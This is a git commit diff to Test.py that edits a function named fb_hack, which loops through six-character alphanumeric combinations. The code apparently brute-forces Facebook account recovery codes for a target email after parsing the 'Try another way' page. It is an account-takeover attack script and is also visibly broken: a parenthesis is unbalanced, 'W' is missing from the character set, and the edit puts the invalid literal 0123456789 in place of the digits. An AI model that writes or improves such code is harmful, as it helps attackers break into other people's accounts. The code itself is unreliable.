6fa7d81106dd2a12011bb00db06abeadfb88b057
krarktel112 <krarktel@gmail.com>
2024-09-23 19:21:23 -0400

    Update Test.py

--- Test.py
+++ Test.py
@@ -79,7 +79,7 @@ def fb_hack(email, codex):
   response1 = browser.response()
   soup = BeautifulSoup(response1, 'html.parser')
   z = soup.find(string("Try another way")
-  for combination in itertools.product([0,1,2,3,4,5,6,7,8,9,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
+  for combination in itertools.product([0123456789,"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z"], repeat=6):
     if counter < codex:
       x = (''.join(map(str, combination)))
       codex += 1
